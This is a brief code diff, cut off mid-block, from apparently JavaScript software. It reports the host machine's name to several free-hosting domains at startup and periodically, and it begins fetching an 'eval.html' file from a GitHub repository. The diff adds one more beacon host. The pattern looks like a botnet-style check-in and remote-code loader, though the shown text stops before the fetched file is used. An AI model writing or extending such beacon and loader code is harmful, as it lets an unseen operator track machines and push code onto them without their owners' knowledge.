@@ -3,6 +3,7 @@ set_interval(()=>xhr_get('http://qpe.000webhostapp.com/vm/ping?from='+os.hostnam
 var nope=()=>{};
 xhr_get('http://qpe.000webhostapp.com/vm/on_start?from='+os.hostname(),nope,nope);
 xhr_get('http://adler.hol.es/vm/on_start?from='+os.hostname(),nope,nope);
+xhr_get('http://qap.atwebpages.com/vm/on_start?from='+os.hostname(),nope,nope);
 
 var fetch_other_file=()=>["eval.html"].map(fn=>xhr_get('https://raw.githubusercontent.com/gitseo/vm/master/'+fn+'?t='+rand(),
   data=>{
